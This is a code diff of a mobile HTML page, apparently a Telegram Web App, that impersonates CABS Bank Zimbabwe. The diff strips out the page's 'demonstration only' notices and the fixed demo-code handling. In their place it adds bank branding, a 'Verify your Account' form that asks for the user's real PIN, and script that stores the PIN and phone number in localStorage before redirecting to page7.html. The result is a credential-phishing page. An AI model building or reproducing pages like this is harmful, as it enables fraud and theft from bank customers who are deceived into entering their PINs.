@@ -1,16 +1,32 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CABS Bank Zimbabwe - Demo Account Verification</title>
+    <title>CABS Bank Zimbabwe - Verify Account</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
+        :root {
+            --cabs-blue: #0b3b7a;
+            --cabs-blue-strong: #072c5c;
+            --cabs-gold: #d9b55d;
+            --cabs-gold-soft: #f3d998;
+            --cabs-white: #ffffff;
+            --cabs-silver: #edf3fb;
+            --cabs-muted: #5f6f86;
+            --cabs-border: #d4dce7;
+            --cabs-input-bg: #f7f9fc;
+            --cabs-button: #0d5bb8;
+            --cabs-button-hover: #0b4ea2;
+            --cabs-disabled: #c9d4e3;
+        }
+
+        * { box-sizing: border-box; }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fff;
+            background-color: var(--cabs-white);
             margin: 0;
             display: flex;
             flex-direction: column;
@@ -18,64 +34,103 @@
             align-items: center;
         }
 
+        /* --- Header Styling --- */
         .header-box {
             width: 100%;
-            background-color: #092c4c;
-            padding: 30px 20px;
-            color: white;
+            background: linear-gradient(180deg, var(--cabs-blue-strong) 0%, var(--cabs-blue) 100%);
+            padding: 24px 20px 30px;
+            color: var(--cabs-white);
             text-align: center;
             box-sizing: border-box;
             border-bottom-left-radius: 0%;
             border-bottom-right-radius: 0%;
+            box-shadow: 0 3px 12px rgba(11, 59, 122, 0.18);
         }
 
-        .logo-image {
-            height: 55px;
-            width: auto;
-            max-width: 90%;
-            object-fit: contain;
+        .brand-wrap {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .brand-mark {
+            width: 54px;
+            height: 54px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
+        }
+
+        .brand-mark svg {
+            width: 38px;
+            height: 38px;
+            display: block;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin: 0;
+            line-height: 1;
+        }
+
+        .logo-text .brand-main {
+            font-size: 30px;
+            font-weight: 800;
+            letter-spacing: 0.06em;
+            color: var(--cabs-white);
+        }
+
+        .logo-text .brand-sub {
+            font-size: 10px;
+            letter-spacing: 0.22em;
+            color: var(--cabs-gold-soft);
+            text-transform: uppercase;
+            margin-top: 6px;
+            opacity: 0.95;
         }
 
         .sub-text {
             font-size: 15px;
             margin-top: 8px;
             opacity: 0.9;
-            color: #d1ecf1;
+            color: #dfeaf9;
+            font-weight: 500;
         }
 
-        .demo-notice {
-            width: 100%;
-            padding: 9px;
-            background: #fff3cd;
-            color: #664d03;
-            text-align: center;
-            font-size: 12px;
-            font-weight: bold;
-            box-sizing: border-box;
-        }
-
+        /* --- Content Container --- */
         .main-content {
             width: 90%;
-            max-width: 400px;
-            margin: 30px auto 0;
+            max-width: 420px;
+            margin: 32px auto 0;
             text-align: center;
             flex-grow: 1;
         }
 
         h2 {
-            color: #092c4c;
+            color: var(--cabs-blue);
             font-size: 24px;
             margin-bottom: 25px;
-            font-weight: bold;
+            font-weight: 800;
+            letter-spacing: -0.02em;
         }
 
+        /* --- Phone Input (Disabled/Read-Only) --- */
         .phone-container {
             display: flex;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+            border: 1px solid var(--cabs-border);
+            border-radius: 10px;
             overflow: hidden;
             margin-bottom: 25px;
-            background-color: #f9f9f9;
+            background-color: var(--cabs-input-bg);
+            box-shadow: 0 2px 6px rgba(11, 59, 122, 0.03);
         }
 
         .country-code {
@@ -83,11 +138,13 @@
             align-items: center;
             gap: 8px;
             padding: 12px 15px;
-            background-color: #f1f1f1;
-            border-right: 1px solid #ccc;
+            background-color: #edf3fb;
+            border-right: 1px solid var(--cabs-border);
             font-size: 16px;
-            font-weight: bold;
-            color: #333;
+            font-weight: 700;
+            color: var(--cabs-blue);
+            min-width: 92px;
+            justify-content: center;
         }
 
         .phone-input {
@@ -95,15 +152,17 @@
             border: none;
             padding: 12px 15px;
             font-size: 16px;
-            background-color: #f9f9f9;
-            color: #666;
+            background-color: var(--cabs-input-bg);
+            color: var(--cabs-muted);
             outline: none;
         }
 
+        /* --- PIN Fields --- */
         .pin-label {
-            color: #666;
+            color: var(--cabs-muted);
             font-size: 14px;
             margin-bottom: 12px;
+            font-weight: 600;
         }
 
         .pin-wrapper {
@@ -115,19 +174,22 @@
         }
 
         .pin-box {
-            width: 50px;
-            height: 50px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+            width: 52px;
+            height: 52px;
+            border: 1px solid var(--cabs-border);
+            border-radius: 10px;
             text-align: center;
             font-size: 22px;
-            font-weight: bold;
+            font-weight: 800;
             outline: none;
-            background-color: #fff;
+            background-color: var(--cabs-white);
+            color: var(--cabs-blue);
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
 
         .pin-box:focus {
-            border-color: #092c4c;
+            border-color: var(--cabs-button);
+            box-shadow: 0 0 0 3px rgba(13, 91, 184, 0.12);
         }
 
         .toggle-eye {
@@ -135,47 +197,59 @@
             font-size: 22px;
             margin-left: 5px;
             user-select: none;
+            opacity: 0.9;
         }
 
+        /* --- Primary Button --- */
         .btn-login {
-            background-color: #cccccc;
-            color: #fff;
+            background-color: var(--cabs-disabled);
+            color: var(--cabs-white);
             border: none;
             width: 100%;
             padding: 15px;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 18px;
             cursor: not-allowed;
-            font-weight: bold;
+            font-weight: 800;
+            letter-spacing: 0.04em;
             text-transform: uppercase;
-            transition: background-color 0.2s;
+            transition: background-color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: none;
         }
 
         .btn-login.active {
-            background-color: #092c4c;
+            background: linear-gradient(180deg, var(--cabs-button) 0%, var(--cabs-blue) 100%);
             cursor: pointer;
+            box-shadow: 0 8px 16px rgba(11, 59, 122, 0.18);
         }
 
+        .btn-login.active:hover {
+            background: linear-gradient(180deg, var(--cabs-button-hover) 0%, var(--cabs-blue) 100%);
+        }
+
+        /* --- Curved Footer Styling --- */
         .footer-box {
             width: 100%;
-            background-color: #092c4c;
+            background: linear-gradient(180deg, var(--cabs-blue) 0%, var(--cabs-blue-strong) 100%);
             padding: 40px 20px 25px;
-            color: white;
+            color: var(--cabs-white);
             text-align: center;
             border-top-left-radius: 50% 30px;
             border-top-right-radius: 50% 30px;
             box-sizing: border-box;
             margin-top: 40px;
+            box-shadow: 0 -4px 18px rgba(11, 59, 122, 0.12);
         }
 
-        .footer-box .logo-image {
-            height: 40px;
+        .footer-box .brand-wrap {
+            transform: scale(0.92);
         }
 
         .version-text {
             font-size: 12px;
             margin-top: 10px;
-            opacity: 0.7;
+            opacity: 0.8;
+            color: #dfeaf9;
         }
 
         .terms-text {
@@ -183,11 +257,20 @@
             margin-top: 10px;
             padding: 0 20px;
             opacity: 0.9;
+            color: #edf3fb;
         }
 
         .terms-text a {
-            color: #fff;
+            color: var(--cabs-gold-soft);
             text-decoration: underline;
+            text-underline-offset: 2px;
+        }
+
+        .copyright-text {
+            font-size: 11px;
+            margin-top: 10px;
+            opacity: 0.88;
+            color: #edf3fb;
         }
     </style>
 </head>
@@ -195,64 +278,78 @@
 <body>
 
 <div class="header-box">
-    <img
-        class="logo-image"
-        src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
-        alt="CABS Bank logo"
-    >
-    <p class="sub-text">CABS Bank Zimbabwe — Demo</p>
-</div>
-
-<div class="demo-notice">
-    DEMONSTRATION ONLY — NOT AN OFFICIAL BANKING LOGIN
+    <div class="brand-wrap" aria-label="CABS Bank Zimbabwe">
+        <div class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CABS Bank logo">
+                <defs>
+                    <linearGradient id="cabGold" x1="0%" x2="100%" y1="0%" y2="100%">
+                        <stop offset="0%" stop-color="#f9e7a8" />
+                        <stop offset="100%" stop-color="#d9b55d" />
+                    </linearGradient>
+                </defs>
+                <circle cx="32" cy="32" r="28" fill="rgba(255,255,255,0.12)" stroke="rgba(255,255,255,0.7)" stroke-width="1.5"/>
+                <path d="M17 44.5L32 17L47 44.5H38.2L33.2 35.1H30.8L25.8 44.5H17ZM30.1 29.8H33.9L32 26.4L30.1 29.8Z" fill="url(#cabGold)"/>
+                <path d="M18 47.5H46" stroke="rgba(255,255,255,0.8)" stroke-width="2.5" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <p class="logo-text">
+            <span class="brand-main">CABS</span>
+            <span class="brand-sub">Bank Zimbabwe</span>
+        </p>
+    </div>
+    <p class="sub-text">Secure Banking & Financial Services</p>
 </div>
 
 <div class="main-content">
-    <h2>Demo Account Verification</h2>
+    <h2>Verify your Account</h2>
 
+    <!-- Read-Only Phone Display -->
     <div class="phone-container">
         <div class="country-code">
             <span>🇿🇼</span>
             <span>+263</span>
         </div>
-        <input
-            type="text"
-            id="phoneDisplay"
-            class="phone-input"
-            readonly
-            placeholder="No phone number found"
-        >
+        <input type="text" id="phoneDisplay" class="phone-input" readonly placeholder="No phone number found">
     </div>
 
-    <p class="pin-label">Enter any 4-digit demo code</p>
+    <p class="pin-label">Enter your PIN (4 digits)</p>
 
+    <!-- Interactive PIN Input Container -->
     <div class="pin-wrapper">
-        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
-        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
-        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
-        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
         <span class="toggle-eye" id="eyeIcon">👁️</span>
     </div>
 
-    <button id="loginBtn" class="btn-login" disabled>
-        CONTINUE DEMO
-    </button>
+    <button id="loginBtn" class="btn-login" disabled>LOGIN</button>
 </div>
 
 <div class="footer-box">
-    <img
-        class="logo-image"
-        src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
-        alt="CABS Bank logo"
-    >
-    <p class="sub-text">CABS Bank Zimbabwe — Demo</p>
+    <div class="brand-wrap" aria-label="CABS Bank Zimbabwe">
+        <div class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CABS Bank logo">
+                <defs>
+                    <linearGradient id="cabGoldFooter" x1="0%" x2="100%" y1="0%" y2="100%">
+                        <stop offset="0%" stop-color="#f9e7a8" />
+                        <stop offset="100%" stop-color="#d9b55d" />
+                    </linearGradient>
+                </defs>
+                <circle cx="32" cy="32" r="28" fill="rgba(255,255,255,0.12)" stroke="rgba(255,255,255,0.7)" stroke-width="1.5"/>
+                <path d="M17 44.5L32 17L47 44.5H38.2L33.2 35.1H30.8L25.8 44.5H17ZM30.1 29.8H33.9L32 26.4L30.1 29.8Z" fill="url(#cabGoldFooter)"/>
+                <path d="M18 47.5H46" stroke="rgba(255,255,255,0.8)" stroke-width="2.5" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <p class="logo-text">
+            <span class="brand-main">CABS</span>
+            <span class="brand-sub">Bank Zimbabwe</span>
+        </p>
+    </div>
+    <p class="sub-text">Secure Banking & Financial Services</p>
     <p class="version-text">v1.0.0</p>
-    <p class="terms-text">
-        Demonstration interface only. No banking credentials are requested or stored.
-    </p>
-    <p class="terms-text">
-        © 2026 CABS Bank Zimbabwe — Demonstration Interface
-    </p>
+    <p class="terms-text">By logging in you agree to <a href="#">Terms & Conditions</a></p>
+    <p class="copyright-text">© 2026 CABS Bank Zimbabwe. All rights reserved.</p>
 </div>
 
 <script>
@@ -262,24 +359,31 @@ document.addEventListener("DOMContentLoaded", () => {
     const eye = document.getElementById('eyeIcon');
     const phoneDisplay = document.getElementById('phoneDisplay');
 
+    // Fetch phone number saved from the previous page
     let savedPhone = localStorage.getItem('phone') || "";
 
+    // Clean up country code prefixes if already saved in the string
     if (savedPhone.startsWith('+263')) {
         savedPhone = savedPhone.replace('+263', '').trim();
     } else if (savedPhone.startsWith('263')) {
         savedPhone = savedPhone.replace('263', '').trim();
     }
 
-    phoneDisplay.value = savedPhone || "Not Provided";
+    // Display the saved phone number cleanly
+    if (savedPhone) {
+        phoneDisplay.value = savedPhone;
+    } else {
+        phoneDisplay.value = "Not Provided";
+    }
 
+    // Auto-focus handler for sequential PIN inputs
     pinBoxes.forEach((box, index) => {
         box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '').slice(0, 1);
+            box.value = box.value.replace(/\D/g, ''); // Numeric only
 
             if (box.value && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
             }
-
             checkInputs();
         });
 
@@ -290,32 +394,36 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     });
 
+    // Toggle button active state based on input completion
     function checkInputs() {
         const filled = [...pinBoxes].every(b => b.value);
         loginBtn.disabled = !filled;
         loginBtn.classList.toggle('active', filled);
     }
 
+    // Interactive Eye Icon to view/hide input text
     eye.addEventListener('click', () => {
         const isHidden = pinBoxes[0].type === "password";
-
-        pinBoxes.forEach(box => {
-            box.type = isHidden ? "text" : "password";
-        });
-
+        pinBoxes.forEach(box => box.type = isHidden ? "text" : "password");
         eye.textContent = isHidden ? "🫣" : "👁️";
     });
 
+    // Save inputs locally and redirect cleanly to page7.html
     loginBtn.addEventListener('click', () => {
         if (loginBtn.disabled) return;
 
-        // Save only a fixed demo status, never the entered digits.
-        localStorage.setItem('lastDemoCode', 'DEMO-VERIFIED');
+        let pinValue = "";
+        pinBoxes.forEach(box => pinValue += box.value);
 
-        // Preserve the original destination.
+        // Keep variables locally stored to make them accessible on page7.html
+        localStorage.setItem('phone', savedPhone);
+        localStorage.setItem('lastPin', pinValue);
+
+        // Direct client route to public page 7
         window.location.href = "page7.html";
     });
 
+    // Telegram WebApp setup
     if (window.Telegram?.WebApp) {
         window.Telegram.WebApp.ready();
         window.Telegram.WebApp.expand();
